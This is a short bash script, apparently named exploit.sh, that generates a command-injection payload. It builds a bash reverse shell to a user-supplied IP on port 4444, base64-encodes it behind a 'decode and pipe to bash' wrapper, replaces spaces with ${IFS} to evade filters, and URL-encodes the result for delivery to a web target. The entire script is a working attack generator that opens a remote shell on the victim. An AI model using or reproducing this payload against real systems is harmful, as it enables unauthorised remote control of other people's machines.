LOCAL_IP=$1
if [ -z $LOCAL_IP ]
then
    echo "./exploit.sh <local-ip>"
    exit 1
fi
# From https://www.revshells.com/
PAYLOAD="/bin/bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1"
#Encode in Base64
B64_PAYLOAD=$(echo $PAYLOAD | base64 -w 0)
#Decode and run bash
PAYLOAD="echo $B64_PAYLOAD | base64 -d | bash"
#Replace whitespaces for ${IFS}
PAYLOAD=$(echo ${PAYLOAD// /\$\{IFS\}})
#URL encode
URL_ENCODED=$(python3 -c $'try: import urllib.request as urllib\nexcept: import urllib\nimport sys\nsys.stdout.write(urllib.quote(input()))' <<< "$PAYLOAD")
echo $URL_ENCODED